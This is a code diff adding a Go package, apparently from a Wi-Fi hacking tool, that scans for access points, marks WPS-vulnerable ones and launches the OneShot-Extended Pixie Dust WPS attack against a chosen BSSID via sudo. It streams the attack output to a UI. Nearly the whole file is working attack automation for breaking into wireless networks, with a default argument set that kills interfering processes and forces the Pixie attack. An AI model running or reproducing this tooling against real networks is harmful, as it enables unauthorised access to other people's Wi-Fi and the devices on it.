@@ -1,0 +1,413 @@
+package wifi
+
+import (
+	"context"
+	"errors"
+	"fmt"
+	"os"
+	"os/exec"
+	"path/filepath"
+	"strconv"
+	"strings"
+	"sync"
+	"syscall"
+	"time"
+
+	"github.com/charmbracelet/x/ansi"
+)
+
+// OneShotDefaultAttack is the default OneShot-Extended argument set:
+// Pixie Dust + kill interfering processes + pixie force.
+const OneShotDefaultAttack = "-P -k -F"
+
+// WPSInfo is the WPS information element data parsed from an iw scan.
+type WPSInfo struct {
+	WPS         bool
+	Version     string
+	Locked      bool
+	Model       string
+	ModelNumber string
+	DeviceName  string
+}
+
+// Vulnerable reports whether OneShot-Extended considers this AP a likely
+// Pixie Dust target: WPS 1.0, or a WSC model/device name present in
+// vulnwsc.txt.
+func (w WPSInfo) Vulnerable(vulnList []string) bool {
+	if !w.WPS {
+		return false
+	}
+	if w.Version == "1.0" || w.Version == "" {
+		return true
+	}
+	if len(vulnList) == 0 {
+		return false
+	}
+	candidates := []string{}
+	model := strings.TrimSpace(w.Model + " " + w.ModelNumber)
+	if model != "" {
+		candidates = append(candidates, model)
+	}
+	if strings.TrimSpace(w.Model) != "" {
+		candidates = append(candidates, strings.TrimSpace(w.Model))
+	}
+	if strings.TrimSpace(w.DeviceName) != "" {
+		candidates = append(candidates, strings.TrimSpace(w.DeviceName))
+	}
+	for _, c := range candidates {
+		for _, v := range vulnList {
+			if strings.EqualFold(strings.TrimSpace(v), c) {
+				return true
+			}
+		}
+	}
+	return false
+}
+
+// Label summarises WPS state for the UI.
+func (w WPSInfo) Label() string {
+	if !w.WPS {
+		return "no WPS"
+	}
+	parts := []string{"WPS " + w.Version}
+	if w.Locked {
+		parts = append(parts, "locked")
+	}
+	if w.DeviceName != "" {
+		parts = append(parts, w.DeviceName)
+	}
+	return strings.Join(parts, " · ")
+}
+
+// ParseWPSScan extracts WPS information per BSSID from `iw dev <iface> scan`.
+func ParseWPSScan(out string) map[string]WPSInfo {
+	infos := make(map[string]WPSInfo)
+	var curBSSID string
+	var cur WPSInfo
+	inWPS := false
+	flush := func() {
+		if curBSSID != "" && cur.WPS {
+			infos[curBSSID] = cur
+		}
+	}
+	for _, raw := range strings.Split(out, "\n") {
+		line := strings.TrimRight(raw, "\r")
+		trimmed := strings.TrimSpace(strings.TrimLeft(line, "\t"))
+		if strings.HasPrefix(trimmed, "BSS ") {
+			flush()
+			fields := strings.Fields(strings.TrimPrefix(trimmed, "BSS "))
+			if len(fields) == 0 {
+				curBSSID = ""
+				continue
+			}
+			curBSSID = strings.ToUpper(fields[0])
+			if idx := strings.Index(curBSSID, "("); idx >= 0 {
+				curBSSID = curBSSID[:idx]
+			}
+			cur = WPSInfo{Version: "1.0"}
+			inWPS = false
+			continue
+		}
+		if curBSSID == "" {
+			continue
+		}
+		if strings.HasPrefix(trimmed, "WPS:") {
+			inWPS = true
+			cur.WPS = true
+			if v := extractWPSVersion(trimmed); v != "" {
+				cur.Version = v
+			}
+			continue
+		}
+		if !inWPS {
+			continue
+		}
+		switch {
+		case strings.Contains(trimmed, "AP setup locked:"):
+			flag := strings.TrimSpace(strings.TrimPrefix(trimmed, "* AP setup locked:"))
+			flag = strings.TrimPrefix(strings.ToLower(flag), "0x")
+			if n, err := strconv.ParseUint(flag, 16, 32); err == nil {
+				cur.Locked = n != 0
+			}
+		case strings.Contains(trimmed, "Model Number:"):
+			cur.ModelNumber = strings.TrimSpace(strings.TrimPrefix(trimmed, "* Model Number:"))
+		case strings.Contains(trimmed, "Model:"):
+			cur.Model = strings.TrimSpace(strings.TrimPrefix(trimmed, "* Model:"))
+		case strings.Contains(trimmed, "Device name:"):
+			cur.DeviceName = strings.TrimSpace(strings.TrimPrefix(trimmed, "* Device name:"))
+		case strings.Contains(trimmed, "Version2:"):
+			cur.Version = "2.0"
+		case strings.Contains(trimmed, "Version:"):
+			if v := extractWPSVersion(trimmed); v != "" {
+				cur.Version = v
+			}
+		}
+	}
+	flush()
+	return infos
+}
+
+func extractWPSVersion(s string) string {
+	idx := strings.Index(s, "Version:")
+	if idx < 0 {
+		return ""
+	}
+	v := strings.TrimSpace(s[idx+len("Version:"):])
+	v = strings.TrimPrefix(v, "2:")
+	v = strings.TrimSpace(v)
+	if v == "" {
+		return ""
+	}
+	if strings.HasPrefix(v, "2") {
+		return "2.0"
+	}
+	if strings.HasPrefix(v, "1") {
+		return "1.0"
+	}
+	return ""
+}
+
+// ScanWPS scans iface and returns WPS data per BSSID.
+func ScanWPS(iface string) (map[string]WPSInfo, error) {
+	iface = strings.TrimSpace(iface)
+	if iface == "" {
+		iface = "wlan0"
+	}
+	s := defaultScanner()
+	out, err := runPrivileged(s, 14*time.Second, "iw", "dev", iface, "scan")
+	if err != nil {
+		return nil, fmt.Errorf("iw scan: %s", cleanCmdError(out, err))
+	}
+	return ParseWPSScan(out), nil
+}
+
+// OneShot describes a discovered OneShot-Extended installation.
+type OneShot struct {
+	Dir      string
+	Script   string
+	VulnList string
+	Err      string
+}
+
+// Found reports whether the ose.py entrypoint was located.
+func (o OneShot) Found() bool { return strings.TrimSpace(o.Script) != "" }
+
+// FindOneShot locates OneShot-Extended. preferred may be a repo directory, a
+// path to ose.py, or empty for auto-detection.
+func FindOneShot(preferred string) OneShot {
+	o := OneShot{}
+	preferred = strings.TrimSpace(preferred)
+	if preferred == "" {
+		preferred = strings.TrimSpace(os.Getenv("CZHAX_ONESHOT_DIR"))
+	}
+	if preferred != "" {
+		o = oneShotFromPath(preferred)
+		if o.Found() {
+			return o.finish()
+		}
+	}
+	home, _ := os.UserHomeDir()
+	candidates := []string{
+		filepath.Join(home, "OneShot-Extended"),
+		filepath.Join(home, "oneshot-extended"),
+		filepath.Join(home, "OneShot"),
+		filepath.Join(home, "tools", "OneShot-Extended"),
+		"/opt/OneShot-Extended",
+		"/opt/oneshot-extended",
+		"/usr/local/share/OneShot-Extended",
+		"/usr/local/share/oneshot-extended",
+		"/usr/share/oneshot-extended",
+	}
+	for _, c := range candidates {
+		if c == "" {
+			continue
+		}
+		if found := oneShotFromPath(c); found.Found() {
+			return found.finish()
+		}
+	}
+	if p, err := exec.LookPath("ose.py"); err == nil {
+		o.Script = p
+		o.Dir = filepath.Dir(p)
+		return o.finish()
+	}
+	o.Err = "OneShot-Extended not found (clone it and set oneshot_dir in config.json or CZHAX_ONESHOT_DIR)"
+	return o
+}
+
+func oneShotFromPath(path string) OneShot {
+	path = strings.TrimSpace(path)
+	if path == "" {
+		return OneShot{}
+	}
+	if st, err := os.Stat(path); err == nil && !st.IsDir() {
+		return OneShot{Dir: filepath.Dir(path), Script: path}
+	}
+	script := filepath.Join(path, "ose.py")
+	if _, err := os.Stat(script); err == nil {
+		return OneShot{Dir: path, Script: script}
+	}
+	return OneShot{}
+}
+
+func (o OneShot) finish() OneShot {
+	if o.VulnList == "" {
+		o.VulnList = DefaultVulnListPath(o.Dir)
+	}
+	return o
+}
+
+// DefaultVulnListPath locates OneShot's vulnwsc.txt vulnerable device list.
+func DefaultVulnListPath(oneShotDir string) string {
+	if env := strings.TrimSpace(os.Getenv("CZHAX_ONESHOT_VULN")); env != "" {
+		return env
+	}
+	home, _ := os.UserHomeDir()
+	candidates := []string{
+		filepath.Join(oneShotDir, "vulnwsc.txt"),
+		filepath.Join(home, ".OneShot-Extended", "vulnwsc.txt"),
+		"/usr/share/oneshot-extended/vulnwsc.txt",
+	}
+	for _, c := range candidates {
+		if c == "" {
+			continue
+		}
+		if st, err := os.Stat(c); err == nil && !st.IsDir() {
+			return c
+		}
+	}
+	return ""
+}
+
+// LoadVulnList reads a OneShot vulnerable-device list. Missing files return an
+// empty list so color mode still works via WPS version detection.
+func LoadVulnList(path string) []string {
+	if strings.TrimSpace(path) == "" {
+		return nil
+	}
+	data, err := os.ReadFile(path)
+	if err != nil {
+		return nil
+	}
+	var out []string
+	for _, line := range strings.Split(string(data), "\n") {
+		line = strings.TrimSpace(line)
+		if line == "" || strings.HasPrefix(line, "#") {
+			continue
+		}
+		out = append(out, line)
+	}
+	return out
+}
+
+// SplitAttackArgs splits a stored argument string such as "-P -k -F".
+func SplitAttackArgs(s string) []string {
+	return strings.Fields(strings.TrimSpace(s))
+}
+
+// RunOneShot executes OneShot-Extended against one AP, streaming cleaned output
+// lines to onLine. It needs root; when not running as root it uses sudo -n.
+func RunOneShot(ctx context.Context, o OneShot, iface, bssid string, attackArgs []string, onLine func(string)) error {
+	if !o.Found() {
+		if o.Err != "" {
+			return errors.New(o.Err)
+		}
+		return errors.New("OneShot-Extended not found")
+	}
+	args := []string{o.Script, "-i", iface, "-b", bssid}
+	args = append(args, attackArgs...)
+	if strings.TrimSpace(o.VulnList) != "" {
+		args = append(args, "--vuln-list", o.VulnList)
+	}
+	bin := "python3"
+	if _, err := exec.LookPath(bin); err != nil {
+		bin = "python"
+	}
+	if os.Geteuid() != 0 {
+		args = append([]string{"-n", bin}, args...)
+		bin = "sudo"
+	}
+
+	cmd := exec.CommandContext(ctx, bin, args...)
+	cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
+	cmd.Cancel = func() error {
+		if cmd.Process == nil {
+			return nil
+		}
+		return syscall.Kill(-cmd.Process.Pid, syscall.SIGTERM)
+	}
+	cmd.WaitDelay = 3 * time.Second
+	pipe, err := cmd.StdoutPipe()
+	if err != nil {
+		return err
+	}
+	errPipe, err := cmd.StderrPipe()
+	if err != nil {
+		return err
+	}
+	if err := cmd.Start(); err != nil {
+		return err
+	}
+	var wg sync.WaitGroup
+	stream := func(f interface{ Read([]byte) (int, error) }) {
+		defer wg.Done()
+		buf := make([]byte, 4096)
+		var pending string
+		for {
+			n, err := f.Read(buf)
+			if n > 0 {
+				pending += strings.ReplaceAll(string(buf[:n]), "\r", "\n")
+				for {
+					idx := strings.IndexByte(pending, '\n')
+					if idx < 0 {
+						break
+					}
+					line := pending[:idx]
+					pending = pending[idx+1:]
+					if s := cleanOneShotLine(line); s != "" && onLine != nil {
+						onLine(s)
+					}
+				}
+				if len(pending) > 4096 {
+					pending = pending[len(pending)-4096:]
+				}
+			}
+			if err != nil {
+				break
+			}
+		}
+		if s := cleanOneShotLine(pending); s != "" && onLine != nil {
+			onLine(s)
+		}
+	}
+	wg.Add(2)
+	go stream(pipe)
+	go stream(errPipe)
+	waitErr := cmd.Wait()
+	wg.Wait()
+	if ctx.Err() != nil {
+		return ctx.Err()
+	}
+	if waitErr != nil {
+		var exitErr *exec.ExitError
+		if errors.As(waitErr, &exitErr) {
+			code := exitErr.ExitCode()
+			if code == 130 || code == 143 || code == -1 {
+				return context.Canceled
+			}
+			return fmt.Errorf("oneshot exited %d", code)
+		}
+		return waitErr
+	}
+	return nil
+}
+
+func cleanOneShotLine(s string) string {
+	s = strings.ReplaceAll(s, "\r", "")
+	s = ansi.Strip(s)
+	s = strings.TrimRight(s, " \t")
+	if strings.TrimSpace(s) == "" {
+		return ""
+	}
+	return s
+}
